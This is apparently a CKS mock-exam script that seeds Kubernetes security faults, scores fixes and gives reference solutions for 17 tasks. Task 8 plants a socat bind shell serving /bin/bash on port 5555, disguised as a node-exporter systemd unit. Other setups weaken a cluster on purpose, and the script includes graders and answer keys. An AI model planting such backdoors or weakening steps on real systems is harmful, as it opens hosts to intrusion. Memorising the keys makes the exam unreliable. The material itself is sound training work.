# CKS mock exam 2: setup_mN seeds task N, score_mN checks it, solve_mN is the reference
# solution. Sourced by setup.sh, score.sh and solve.sh with MOCK=2, after tasks/lib.sh,
# the domain task files (for helpers such as cks_users and restart_apiserver) and tasks.sh.

MOCK_TASKS="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17"
# Task 13 and 16 restart the API server, so they go first; task 1 breaks it, so it goes last.
MOCK_SETUP_ORDER="13 16 2 3 4 5 6 7 8 9 10 11 12 14 15 17 1"
# The API server must run before anything else gets fixed.
MOCK_SOLVE_ORDER="1 13 11 5 2 3 4 6 7 8 9 10 12 14 15 16 17"
MOCK_NEEDS_LIMA=yes
mock_points() {
  case "$1" in
    1) echo 8;; 2) echo 6;; 3) echo 6;; 4) echo 6;; 5) echo 5;; 6) echo 6;; 7) echo 5;; 8) echo 4;; 9) echo 7;;
    10) echo 5;; 11) echo 7;; 12) echo 4;; 13) echo 7;; 14) echo 4;; 15) echo 8;; 16) echo 6;; 17) echo 6;;
  esac
}
mock_title() {
  case "$1" in
    1) echo "The API server is down";; 2) echo "Lock down the payments namespace";; 3) echo "HTTP rules with Cilium";;
    4) echo "Harden the worker's kubelet";; 5) echo "TLS 1.3 only";; 6) echo "Who may exec into pods?";;
    7) echo "A token for the vault";; 8) echo "A backdoor on the worker";; 9) echo "AppArmor for the web Deployment";;
    10) echo "Read a Secret from etcd";; 11) echo "Pod Security for every namespace";; 12) echo "Pods with host access";;
    13) echo "The image policy fails open";; 14) echo "Pin by digest";; 15) echo "Catch package managers with Falco";;
    16) echo "Who deleted the Secret?";; 17) echo "Immutable nginx";;
  esac
}
M2_ADM=/etc/kubernetes/admission/config.yaml
# Policies take a few seconds to reach Calico and Cilium, longer right after an API server
# restart, so network checks retry for up to 30 seconds.
eventually() { local i; for i in 1 2 3 4 5 6 7 8 9 10; do "$@" && return 0; sleep 3; done; return 1; }
# Right after the API server restarts, Calico took longer than 30 seconds in the test run.
eventually_long() {
  local i
  k get --raw=/readyz >/dev/null 2>&1 || return 1      # no point waiting while the API server is down
  for i in $(seq 1 36); do "$@" && return 0; sleep 5; done; return 1
}
mk_ns() { cp_sh "for n in $*; do kubectl create ns \$n --dry-run=client -o yaml | kubectl apply -f - >/dev/null; done; for n in $*; do for i in \$(seq 1 30); do kubectl -n \$n get sa default >/dev/null 2>&1 && break; sleep 1; done; done"; }
mk_ns_lima() { lima_sh "for n in $*; do kubectl create ns \$n --dry-run=client -o yaml | kubectl apply -f - >/dev/null; done; for n in $*; do for i in \$(seq 1 30); do kubectl -n \$n get sa default >/dev/null 2>&1 && break; sleep 1; done; done"; }

# ---- 1. The API server is down (8) -----------------------------------------------------------------
setup_m1() {
  oncp <<'EOF'
f=/etc/kubernetes/manifests/kube-apiserver.yaml
sed -i -e 's|--etcd-servers=https://127.0.0.1:2379|--etcd-servers=https://127.0.0.1:2380|' \
       -e 's|--tls-private-key-file=/etc/kubernetes/pki/apiserver.key|--tls-private-key-file=/etc/kubernetes/pki/apiserver.pem|' $f
EOF
}
score_m1() {
  local f=/etc/kubernetes/manifests/kube-apiserver.yaml
  check_cp "the API server answers" "kubectl get --raw=/readyz"
  check_cp "--etcd-servers points to etcd's client port 2379" "grep -q -- '--etcd-servers=https://127.0.0.1:2379\$' $f"
  check_cp "--tls-private-key-file is apiserver.key" "grep -q -- '--tls-private-key-file=/etc/kubernetes/pki/apiserver.key\$' $f"
}
solve_m1() {
  cp_sh "sed -i -e 's|127.0.0.1:2380\$|127.0.0.1:2379|' -e 's|pki/apiserver.pem\$|pki/apiserver.key|' /etc/kubernetes/manifests/kube-apiserver.yaml"
  sleep 5; wait_api; wait_static kube-apiserver
}

# ---- 2. Lock down the payments namespace (6) ---------------------------------------------------------
setup_m2() {
  mk_ns m2-pay m2-data m2-fake
  oncp <<'EOF'
kubectl label ns m2-data tier=data --overwrite >/dev/null
kubectl -n m2-pay run gateway --image=busybox:1.36 -l app=gateway -- sleep 1d 2>/dev/null
kubectl -n m2-pay run ledger --image=nginx:1.27-alpine -l app=ledger --port 80 --expose 2>/dev/null
kubectl -n m2-data run postgres --image=nginx:1.27-alpine -l app=postgres --port 80 --expose 2>/dev/null
kubectl -n m2-fake run postgres --image=nginx:1.27-alpine -l app=postgres --port 80 --expose 2>/dev/null
EOF
}
score_m2() {
  check_cp "NetworkPolicy deny-all in m2-pay blocks ingress and egress for every pod" \
    "kubectl -n m2-pay get netpol deny-all -o jsonpath='{.spec.podSelector}{.spec.policyTypes}' | grep -Fqx '{}[\"Ingress\",\"Egress\"]'"
  check "gateway reaches ledger by name" eventually_long cp_sh "kubectl -n m2-pay exec gateway -- wget -qO- -T 3 http://ledger"
  check "ledger reaches postgres in m2-data by name" eventually_long cp_sh "kubectl -n m2-pay exec ledger -- wget -qO- -T 3 http://postgres.m2-data"
  check "gateway does not reach postgres" eventually cp_sh "! kubectl -n m2-pay exec gateway -- wget -qO- -T 3 http://postgres.m2-data"
  check "ledger does not reach postgres in m2-fake" eventually cp_sh "! kubectl -n m2-pay exec ledger -- wget -qO- -T 3 http://postgres.m2-fake"
}
solve_m2() {
  oncp <<'EOF'
kubectl apply -f - <<'YAML'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: deny-all, namespace: m2-pay}
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: ledger-ingress, namespace: m2-pay}
spec:
  podSelector: {matchLabels: {app: ledger}}
  policyTypes: [Ingress]
  ingress:
  - from: [{podSelector: {matchLabels: {app: gateway}}}]
    ports: [{protocol: TCP, port: 80}]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: dns, namespace: m2-pay}
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to:
    - namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: kube-system}}
      podSelector: {matchLabels: {k8s-app: kube-dns}}
    ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: gateway-egress, namespace: m2-pay}
spec:
  podSelector: {matchLabels: {app: gateway}}
  policyTypes: [Egress]
  egress:
  - to: [{podSelector: {matchLabels: {app: ledger}}}]
    ports: [{protocol: TCP, port: 80}]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: ledger-egress, namespace: m2-pay}
spec:
  podSelector: {matchLabels: {app: ledger}}
  policyTypes: [Egress]
  egress:
  - to:
    - namespaceSelector: {matchLabels: {tier: data}}
      podSelector: {matchLabels: {app: postgres}}
    ports: [{protocol: TCP, port: 80}]
YAML
EOF
}

# ---- 3. HTTP rules with Cilium (6, Lima) -------------------------------------------------------------
setup_m3() {
  mk_ns_lima m2-api
  onlima <<'EOF'
kubectl -n m2-api run api --image=nginx:1.27-alpine -l app=api --port 80 --expose --command -- sh -c \
  'for d in v1/orders v1/items internal; do mkdir -p /usr/share/nginx/html/$d && echo $d > /usr/share/nginx/html/$d/index.html; done; exec nginx -g "daemon off;"' 2>/dev/null
kubectl -n m2-api run web --image=busybox:1.36 -l app=web -- sleep 1d 2>/dev/null
kubectl -n m2-api run batch --image=busybox:1.36 -l app=batch -- sleep 1d 2>/dev/null
EOF
}
l7() { lima_sh "kubectl -n m2-api exec $1 -- wget -qO- -T 5 $2 http://api$3 2>&1"; }
m3_get_items() { local o; o="$(l7 web '' /v1/items/)"; echo "$o" | grep -qx v1/items; }
# score.sh runs with pipefail and wget exits 1 on a 403, so read the output first.
m3_internal_403() { local o; o="$(l7 web '' /internal/)"; echo "$o" | grep -q 403; }
m3_post_orders() { local o; o="$(l7 web --post-data=x /v1/orders/)"; ! echo "$o" | grep -qE '403|timed out'; }
m3_post_items_403() { local o; o="$(l7 web --post-data=x /v1/items/)"; echo "$o" | grep -q 403; }
score_m3() {
  check_lima "CiliumNetworkPolicy api-http in m2-api has HTTP rules" \
    "kubectl -n m2-api get cnp api-http -o jsonpath='{.spec.ingress[*].toPorts[*].rules.http}' | grep -q path"
  check "web gets /v1/items/ with GET" eventually m3_get_items
  check "web gets 403 for /internal/" eventually m3_internal_403
  check "web is not refused for a POST to /v1/orders/" eventually m3_post_orders
  check "web gets 403 for a POST to /v1/items/" eventually m3_post_items_403
  check "batch does not reach api at all" eventually lima_sh "! kubectl -n m2-api exec batch -- wget -qO- -T 3 http://api/v1/items/"
}
solve_m3() {
  onlima <<'EOF'
kubectl apply -f - <<'YAML'
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata: {name: api-http, namespace: m2-api}
spec:
  endpointSelector: {matchLabels: {app: api}}
  ingress:
  - fromEndpoints: [{matchLabels: {app: web}}]
    toPorts:
    - ports: [{port: "80", protocol: TCP}]
      rules:
        http:
        - {method: GET, path: "/v1/.*"}
        - {method: POST, path: "/v1/orders/.*"}
YAML
EOF
}

# ---- 4. Harden the worker's kubelet (6) ----------------------------------------------------------------
setup_m4() { setup_1_13 >/dev/null; }
score_m4() {
  check_w1 "an anonymous request to the kubelet API gets 401" \
    "curl -sk -m 3 -o /dev/null -w '%{http_code}' https://127.0.0.1:10250/pods | grep -qx 401"
  check_w1 "nothing answers on the read-only port 10255" "! curl -s -m 3 -o /dev/null http://127.0.0.1:10255/pods"
  check_w1 "the kubelet config sets authorization mode Webhook" "grep -A1 '^authorization:' /var/lib/kubelet/config.yaml | grep -q 'mode: Webhook'"
  check_cp "cks-w1 is Ready" "kubectl wait node cks-w1 --for=condition=Ready --timeout=60s"
}
solve_m4() { solve_1_13; }

# ---- 5. TLS 1.3 only (5) --------------------------------------------------------------------------------
setup_m5() { :; }
score_m5() {
  check_cp "the API server sets --tls-min-version=VersionTLS13" "grep -q -- '--tls-min-version=VersionTLS13\$' /etc/kubernetes/manifests/kube-apiserver.yaml"
  check "the API server refuses TLS 1.2" tls_refused 6443 "-tls1_2"
  check "the API server accepts TLS 1.3" tls_ok 6443 "-tls1_3"
}
solve_m5() {
  set_flag kube-apiserver --tls-min-version VersionTLS13
  sleep 5; wait_api; wait_static kube-apiserver
}

# ---- 6. Who may exec into pods? (6) ------------------------------------------------------------------------
setup_m6() {
  mk_ns m2-team
  oncp <<'EOF'
for sa in ci docs ops; do kubectl -n m2-team create sa $sa 2>/dev/null; done
kubectl -n m2-team create deploy web --image=nginx:1.27-alpine 2>/dev/null
kubectl -n m2-team create deploy api --image=nginx:1.27-alpine 2>/dev/null
kubectl create clusterrole debug-helper --verb=create --resource=pods/exec,pods/attach 2>/dev/null
kubectl create clusterrolebinding debug-helper --clusterrole=debug-helper --serviceaccount=m2-team:docs 2>/dev/null
kubectl -n m2-team create role ci --verb=get,list --resource=pods 2>/dev/null
kubectl -n m2-team create rolebinding ci --role=ci --serviceaccount=m2-team:ci 2>/dev/null
mkdir -p /root/mock
EOF
}
as_m2() { k auth can-i "$2" "$3" -n "${4:-m2-team}" --as="system:serviceaccount:m2-team:$1"; }
m6_web() { as_m2 docs get deployment.apps/web && as_m2 docs patch deployment.apps/web; }
m6_not_api() { ! as_m2 docs patch deployment.apps/api; }
score_m6() {
  check_cp "/root/mock/exec-sa.txt names docs" "grep -qx docs /root/mock/exec-sa.txt"
  check "docs may no longer exec into pods anywhere" bash -c "! orb -m $CKS_CP -u root kubectl auth can-i create pods/exec -A --as=system:serviceaccount:m2-team:docs"
  check "docs may get and patch Deployment web" m6_web
  check "docs may not patch Deployment api" m6_not_api
  check "ci keeps its rights" as_m2 ci list pods
}
solve_m6() {
  oncp <<'EOF'
for sa in ci docs ops; do echo "$sa $(kubectl auth can-i create pods/exec -A --as=system:serviceaccount:m2-team:$sa)"; done
echo docs > /root/mock/exec-sa.txt
kubectl delete clusterrolebinding debug-helper
kubectl -n m2-team create role restart-web --verb=get,patch --resource=deployments.apps --resource-name=web
kubectl -n m2-team create rolebinding restart-web --role=restart-web --serviceaccount=m2-team:docs
EOF
}

# ---- 7. A token for the vault (5) ----------------------------------------------------------------------------
setup_m7() { mk_ns m2-vault; cp_sh 'kubectl -n m2-vault create sa reader 2>/dev/null; true'; }
score_m7() {
  check_cp "pod agent runs as reader with a projected token for audience vault.m2, 1800 seconds" \
    "kubectl -n m2-vault wait pod agent --for=condition=Ready --timeout=60s && kubectl -n m2-vault exec agent -- cat /var/run/secrets/tokens/vault-token | python3 -c '$JWT_CLAIMS' | python3 -c 'import json,sys; c=json.load(sys.stdin); sys.exit(0 if c[\"aud\"]==[\"vault.m2\"] and c[\"exp\"]-c[\"iat\"]==1800 and c[\"sub\"].endswith(\":reader\") else 1)'"
  check_cp "pod agent has no default API token" "! kubectl -n m2-vault exec agent -- ls /var/run/secrets/kubernetes.io/serviceaccount/token"
}
solve_m7() {
  oncp <<'EOF'
kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata: {name: agent, namespace: m2-vault}
spec:
  serviceAccountName: reader
  automountServiceAccountToken: false
  containers:
  - name: agent
    image: busybox:1.36
    command: [sleep, 1d]
    volumeMounts: [{name: tokens, mountPath: /var/run/secrets/tokens, readOnly: true}]
  volumes:
  - name: tokens
    projected:
      sources:
      - serviceAccountToken: {audience: vault.m2, expirationSeconds: 1800, path: vault-token}
YAML
kubectl -n m2-vault wait pod agent --for=condition=Ready --timeout=90s
EOF
}

# ---- 8. A backdoor on the worker (4) -------------------------------------------------------------------------
setup_m8() {
  onw1 <<'EOF'
mkdir -p /opt/.cache && cp /usr/bin/socat /opt/.cache/nel
cat > /etc/systemd/system/node-exporter-lite.service <<'UNIT'
[Unit]
Description=Node exporter (lite)
[Service]
ExecStart=/opt/.cache/nel TCP-LISTEN:5555,fork,reuseaddr EXEC:/bin/bash
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload; systemctl enable --now node-exporter-lite >/dev/null 2>&1
EOF
}
score_m8() {
  check_w1 "nothing listens on TCP port 5555" "! ss -tln | grep -q ':5555 '"
  check_w1 "the unit and its binary are gone" "! systemctl cat node-exporter-lite >/dev/null 2>&1 && test ! -e /opt/.cache/nel"
}
solve_m8() { w1_sh 'systemctl disable --now node-exporter-lite; rm -f /etc/systemd/system/node-exporter-lite.service /opt/.cache/nel; systemctl daemon-reload'; }

# ---- 9. AppArmor for the web Deployment (7, Lima) ---------------------------------------------------------------
setup_m9() {
  mk_ns_lima m2-aa
  onlima <<'EOF'
mkdir -p /root/mock
cat > /root/mock/m2-profile <<'PROFILE'
#include <tunables/global>

profile m2-readonly-html flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  network,
  capability,
  file,
  umount,
  deny /usr/share/nginx/html/** w,
  deny /etc/nginx/nginx.conf w,
}
PROFILE
apparmor_parser -R /root/mock/m2-profile 2>/dev/null; true
kubectl -n m2-aa create deploy web --image=nginx:1.27-alpine 2>/dev/null
EOF
}
score_m9() {
  check_lima "Deployment web asks for the Localhost profile m2-readonly-html" \
    "kubectl -n m2-aa get deploy web -o jsonpath='{.spec.template.spec.containers[0].securityContext.appArmorProfile.type}/{.spec.template.spec.containers[0].securityContext.appArmorProfile.localhostProfile}{.spec.template.spec.securityContext.appArmorProfile.type}/{.spec.template.spec.securityContext.appArmorProfile.localhostProfile}' | grep -q 'Localhost/m2-readonly-html'"
  check_lima "the profile is loaded in enforce mode" "aa-status 2>/dev/null | sed -n '/profiles are in enforce mode/,/profiles are in complain mode/p' | grep -qx '   m2-readonly-html'"
  check_lima "web runs, and a write to /etc/nginx fails" \
    "kubectl -n m2-aa rollout status deploy web --timeout=60s && kubectl -n m2-aa exec deploy/web -- sh -c 'echo x >> /etc/nginx/nginx.conf' 2>&1 | grep -q 'Permission denied'"
}
solve_m9() {
  onlima <<'EOF'
cp /root/mock/m2-profile /etc/apparmor.d/m2-readonly-html
apparmor_parser -r /etc/apparmor.d/m2-readonly-html
kubectl -n m2-aa patch deploy web --type=json -p='[{"op":"add","path":"/spec/template/spec/containers/0/securityContext","value":{"appArmorProfile":{"type":"Localhost","localhostProfile":"m2-readonly-html"}}}]'
kubectl -n m2-aa rollout status deploy web --timeout=120s
EOF
}

# ---- 10. Read a Secret from etcd (5) ------------------------------------------------------------------------------
setup_m10() {
  mk_ns m2-etcd
  cp_sh 'kubectl -n m2-etcd create secret generic root-cred --from-literal=password=$(head -c 12 /dev/urandom | base64 | tr -d "/+=") 2>/dev/null; mkdir -p /root/mock; true'
}
score_m10() {
  check_cp "/root/mock/root-cred.txt holds the password" \
    "test -s /root/mock/root-cred.txt && [ \"\$(cat /root/mock/root-cred.txt)\" = \"\$(kubectl -n m2-etcd get secret root-cred -o jsonpath='{.data.password}' | base64 -d)\" ]"
  check_cp "/root/mock/root-cred-key.txt holds the etcd key" "grep -qx /registry/secrets/m2-etcd/root-cred /root/mock/root-cred-key.txt"
}
solve_m10() {
  oncp <<EOF
echo /registry/secrets/m2-etcd/root-cred > /root/mock/root-cred-key.txt
$ETC get /registry/secrets/m2-etcd/root-cred --print-value-only | tr -cs '[:print:]' '\n' | grep -A1 -x password | tail -1 > /root/mock/root-cred.txt
cat /root/mock/root-cred.txt
EOF
}

# ---- 11. Pod Security for every namespace (7) -------------------------------------------------------------------
setup_m11() { mk_ns m2-agents m2-open; }
score_m11() {
  check_cp "the admission configuration configures PodSecurity" "grep -q 'name: PodSecurity' $M2_ADM"
  check_cp "a privileged pod in the unlabelled namespace m2-open is refused" "! kubectl -n m2-open run t1 --image=busybox:1.36 --privileged --dry-run=server -- sleep 1"
  check_cp "a root pod in m2-open gets a restricted warning" \
    "kubectl -n m2-open run t2 --image=busybox:1.36 --dry-run=server -- sleep 1 2>&1 | grep -q 'would violate PodSecurity \"restricted:latest\"'"
  check_cp "a privileged pod in m2-agents is admitted" "kubectl -n m2-agents run t3 --image=busybox:1.36 --privileged --dry-run=server -- sleep 1"
}
solve_m11() {
  oncp <<'EOF'
cat >> /etc/kubernetes/admission/config.yaml <<'YAML'
- name: PodSecurity
  configuration:
    apiVersion: pod-security.admission.config.k8s.io/v1
    kind: PodSecurityConfiguration
    defaults: {enforce: baseline, enforce-version: latest, warn: restricted, warn-version: latest, audit: restricted, audit-version: latest}
    exemptions: {usernames: [], runtimeClasses: [], namespaces: [kube-system, m2-agents]}
YAML
EOF
  restart_apiserver
}

# ---- 12. Pods with host access (4) ---------------------------------------------------------------------------------
setup_m12() {
  mk_ns m2-legacy
  oncp <<'EOF'
kubectl label ns m2-legacy pod-security.kubernetes.io/enforce=privileged --overwrite >/dev/null
kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata: {name: shell, namespace: m2-legacy}
spec:
  hostIPC: true
  containers: [{name: c, image: busybox:1.36, command: [sleep, 1d]}]
---
apiVersion: v1
kind: Pod
metadata: {name: backup, namespace: m2-legacy}
spec:
  containers:
  - {name: c, image: busybox:1.36, command: [sleep, 1d], volumeMounts: [{name: etc, mountPath: /host-etc}]}
  volumes: [{name: etc, hostPath: {path: /etc}}]
---
apiVersion: v1
kind: Pod
metadata: {name: app, namespace: m2-legacy}
spec:
  containers: [{name: c, image: busybox:1.36, command: [sleep, 1d]}]
---
apiVersion: v1
kind: Pod
metadata: {name: sidecar-priv, namespace: m2-legacy}
spec:
  containers:
  - {name: main, image: busybox:1.36, command: [sleep, 1d]}
  - {name: helper, image: busybox:1.36, command: [sleep, 1d], securityContext: {privileged: true}}
YAML
EOF
}
score_m12() {
  check_cp "shell, backup and sidecar-priv are gone" \
    "kubectl get ns m2-legacy >/dev/null && ! kubectl -n m2-legacy get pod shell 2>/dev/null && ! kubectl -n m2-legacy get pod backup 2>/dev/null && ! kubectl -n m2-legacy get pod sidecar-priv 2>/dev/null"
  check_cp "app still runs" "kubectl -n m2-legacy get pod app"
}
solve_m12() { k -n m2-legacy delete pod shell backup sidecar-priv --now >/dev/null; }

# ---- 13. The image policy fails open (7) -----------------------------------------------------------------------------
setup_m13() {
  oncp <<'EOF'
mkdir -p /etc/kubernetes/admission
cat > /etc/kubernetes/admission/config.yaml <<'YAML'
apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
plugins:
- name: ImagePolicyWebhook
  configuration:
    imagePolicy:
      kubeConfigFile: /etc/kubernetes/policy-webhook/kubeconfig.yaml
      allowTTL: 50
      denyTTL: 50
      retryBackoff: 500
      defaultAllow: true
YAML
sed -i 's/--enable-admission-plugins=NodeRestriction$/--enable-admission-plugins=NodeRestriction,ImagePolicyWebhook/' /etc/kubernetes/manifests/kube-apiserver.yaml
systemctl disable --now image-policy >/dev/null 2>&1
EOF
  set_flag kube-apiserver --admission-control-config-file $M2_ADM
  apiserver_mount admission /etc/kubernetes/admission
  apiserver_mount policy-webhook /etc/kubernetes/policy-webhook
  sleep 5; wait_api; wait_static kube-apiserver
}
score_m13() {
  check_cp "ImagePolicyWebhook refuses pods when the back end is down (defaultAllow: false)" "grep -q 'defaultAllow: false' $M2_ADM"
  check_cp "the image-policy service runs and starts at boot" "systemctl is-active -q image-policy && systemctl is-enabled -q image-policy"
  check_cp "busybox:1.36 is admitted" "kubectl -n default run m13-ok --image=busybox:1.36 --dry-run=server -- sleep 1"
  check_cp "quay.io/evil/miner:1 is refused" "! kubectl -n default run m13-bad --image=quay.io/evil/miner:1 --dry-run=server"
}
solve_m13() {
  cp_sh "sed -i 's/defaultAllow: true/defaultAllow: false/' $M2_ADM && systemctl enable --now image-policy >/dev/null 2>&1"
  restart_apiserver
}

# ---- 14. Pin by digest (4) ----------------------------------------------------------------------------------------------
setup_m14() { mk_ns m2-pin; cp_sh 'kubectl -n m2-pin create deploy worker --image=busybox:1.36 -- sleep 1d 2>/dev/null; true'; }
score_m14() {
  local want
  want="$(w1_sh "crictl inspecti -o json docker.io/library/busybox:1.36 | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"status\"][\"repoDigests\"][0].split(\"@\")[1])'")"
  check "Deployment worker names busybox:1.36 by its digest" \
    bash -c "[ -n \"\$1\" ] && orb -m $CKS_CP -u root kubectl -n m2-pin get deploy worker -o jsonpath='{.spec.template.spec.containers[0].image}' | grep -qE \"busybox(:1.36)?@\$1\"" _ "$want"
  check_cp "worker has a ready pod" "kubectl -n m2-pin rollout status deploy worker --timeout=90s"
}
solve_m14() {
  cp_sh 'ID=$(kubectl -n m2-pin get pod -l app=worker -o jsonpath="{.items[0].status.containerStatuses[0].imageID}"); kubectl -n m2-pin set image deploy/worker busybox="busybox@${ID#*@}" >/dev/null; kubectl -n m2-pin rollout status deploy worker --timeout=120s'
}

# ---- 15. Catch package managers with Falco (8) ----------------------------------------------------------------------------
setup_m15() {
  mk_ns m2-run
  oncp <<'EOF'
kubectl -n m2-run create deploy web --image=nginx:1.27-alpine 2>/dev/null
kubectl -n m2-run create deploy updater --image=nginx:1.27-alpine -- sh -c 'while true; do apk info >/dev/null 2>&1; sleep 10; done' 2>/dev/null
kubectl -n m2-run create deploy worker --image=busybox:1.36 -- sh -c 'while true; do sleep 10; done' 2>/dev/null
EOF
  w1_sh 'rm -f /etc/falco/rules.d/m2.yaml'
}
m2_falco_fires() {
  local n since
  for n in 1 2 3 4 5 6 7 8; do
    since="$(w1_sh 'date "+%Y-%m-%d %H:%M:%S"')"
    k -n m2-run exec deploy/web -- apk --version >/dev/null 2>&1; sleep 2
    w1_sh "journalctl -u falco-modern-bpf --since '$since' --no-pager | grep -qE 'Critical pkg \\(ns=m2-run pod=web-[a-z0-9-]+ cmd=apk --version\\)'" && return 0
  done
  return 1
}
score_m15() {
  local py='import yaml,sys; d=yaml.safe_load(open("/etc/falco/rules.d/m2.yaml")); L={x["list"]:x for x in d if "list" in x}; M={x["macro"] for x in d if "macro" in x}; R={x["rule"]:x for x in d if "rule" in x}; r=R["Package manager in container (mock)"]'
  check_w1 "rule 'Package manager in container (mock)' uses list m2_pkg and macro m2_k8s" \
    "python3 -c '$py; sys.exit(0 if \"m2_k8s\" in M and {\"apk\",\"apt\",\"apt-get\",\"pip\",\"npm\"} <= set(L[\"m2_pkg\"][\"items\"]) and \"m2_pkg\" in r[\"condition\"] and \"m2_k8s\" in r[\"condition\"] and r[\"priority\"].upper()==\"CRITICAL\" else 1)'"
  check "apk in m2-run/web raises the alert in the required format" m2_falco_fires
  check_cp "/root/mock/pkg-deploy.txt says updater, and updater is scaled to 0" \
    "grep -qx updater /root/mock/pkg-deploy.txt && kubectl -n m2-run get deploy updater -o jsonpath='{.spec.replicas}' | grep -qx 0"
  check_cp "web and worker keep their replica" "kubectl -n m2-run get deploy web worker -o jsonpath='{.items[*].spec.replicas}' | grep -qx '1 1'"
}
solve_m15() {
  onw1 <<'EOF'
cat > /etc/falco/rules.d/m2.yaml <<'YAML'
- list: m2_pkg
  items: [apk, apt, apt-get, pip, npm]
- macro: m2_k8s
  condition: (container and k8s.ns.name exists)
- rule: Package manager in container (mock)
  desc: A package manager runs in a pod
  condition: spawned_process and m2_k8s and proc.name in (m2_pkg)
  output: "pkg (ns=%k8s.ns.name pod=%k8s.pod.name cmd=%proc.cmdline)"
  priority: CRITICAL
YAML
for i in $(seq 1 15); do journalctl -u falco-modern-bpf --since '-1min' --no-pager | grep -q 'm2.yaml' && break; sleep 2; done
EOF
  local pod=""
  for _ in $(seq 1 15); do
    pod="$(w1_sh "journalctl -u falco-modern-bpf --since '-2min' --no-pager | grep 'Critical pkg (ns=m2-run' | grep -v 'cmd=apk --version' | tail -1 | grep -o 'pod=[^ ]*' | cut -d= -f2")"
    [ -n "$pod" ] && break; sleep 4
  done
  echo "Falco names pod $pod"
  cp_sh "d=\$(kubectl -n m2-run get pod $pod -o jsonpath='{.metadata.labels.app}'); echo \$d > /root/mock/pkg-deploy.txt; kubectl -n m2-run scale deploy \$d --replicas=0"
}

# ---- 16. Who deleted the Secret? (6) ------------------------------------------------------------------------------------
setup_m16() {
  if ! cp_sh "grep -q -- '--audit-policy-file=' /etc/kubernetes/manifests/kube-apiserver.yaml"; then solve_6_1 >/dev/null 2>&1; fi
  cks_users dave erin frank
  mk_ns m2-audit
  oncp <<'EOF'
kubectl -n m2-audit create role secrets --verb=get,list,delete --resource=secrets 2>/dev/null
for u in dave erin frank; do kubectl -n m2-audit create rolebinding $u --role=secrets --user=$u 2>/dev/null; done
kubectl -n m2-audit create secret generic api-keys --from-literal=k=v 2>/dev/null
kubectl -n m2-audit create secret generic tls-old --from-literal=k=v 2>/dev/null
EOF
  as_user dave -n m2-audit get secret api-keys >/dev/null
  as_user frank -n m2-audit get secrets >/dev/null
  as_user erin -n m2-audit delete secret api-keys >/dev/null
  as_user frank -n m2-audit delete secret tls-old >/dev/null
}
score_m16() {
  check_cp "/root/mock/deleter.txt names erin" "grep -qx erin /root/mock/deleter.txt"
  check_cp "erin may no longer delete Secrets in m2-audit; dave and frank keep their rights" \
    "! kubectl auth can-i delete secrets -n m2-audit --as=erin && kubectl auth can-i delete secrets -n m2-audit --as=frank && kubectl auth can-i get secrets -n m2-audit --as=dave"
}
solve_m16() {
  oncp <<'EOF'
grep '"verb":"delete"' /var/log/kubernetes/audit/audit.log | grep '"name":"api-keys"' | grep ResponseComplete \
  | python3 -c 'import json,sys; print(json.loads(sys.stdin.readline())["user"]["username"])' | tee /root/mock/deleter.txt
kubectl -n m2-audit delete rolebinding erin
EOF
}

# ---- 17. Immutable nginx (6) ----------------------------------------------------------------------------------------------
setup_m17() { mk_ns m2-hard; cp_sh 'kubectl -n m2-hard create deploy web --image=nginx:1.27-alpine --port 80 2>/dev/null; kubectl -n m2-hard expose deploy web --port 80 2>/dev/null; true'; }
score_m17() {
  check_cp "container nginx: readOnlyRootFilesystem, no privilege escalation, seccomp RuntimeDefault" \
    "kubectl -n m2-hard get deploy web -o json | python3 -c 'import json,sys; s=json.load(sys.stdin)[\"spec\"][\"template\"][\"spec\"]; c=s[\"containers\"][0].get(\"securityContext\",{}); p=s.get(\"securityContext\",{}); sys.exit(0 if c.get(\"readOnlyRootFilesystem\") and c.get(\"allowPrivilegeEscalation\") is False and (c.get(\"seccompProfile\") or p.get(\"seccompProfile\") or {}).get(\"type\")==\"RuntimeDefault\" else 1)'"
  check_cp "web serves, and its root file system refuses writes" \
    "kubectl -n m2-hard rollout status deploy web --timeout=90s && ! kubectl -n m2-hard exec deploy/web -- touch /x && kubectl -n m2-hard exec deploy/web -- wget -qO- -T 3 http://127.0.0.1 | grep -q nginx"
}
solve_m17() {
  oncp <<'EOF'
kubectl -n m2-hard patch deploy web --type=json -p='[
 {"op":"add","path":"/spec/template/spec/containers/0/securityContext","value":{"readOnlyRootFilesystem":true,"allowPrivilegeEscalation":false,"seccompProfile":{"type":"RuntimeDefault"}}},
 {"op":"add","path":"/spec/template/spec/containers/0/volumeMounts","value":[{"name":"cache","mountPath":"/var/cache/nginx"},{"name":"run","mountPath":"/run"},{"name":"tmp","mountPath":"/tmp"}]},
 {"op":"add","path":"/spec/template/spec/volumes","value":[{"name":"cache","emptyDir":{}},{"name":"run","emptyDir":{}},{"name":"tmp","emptyDir":{}}]}]'
kubectl -n m2-hard rollout status deploy web --timeout=120s
EOF
}
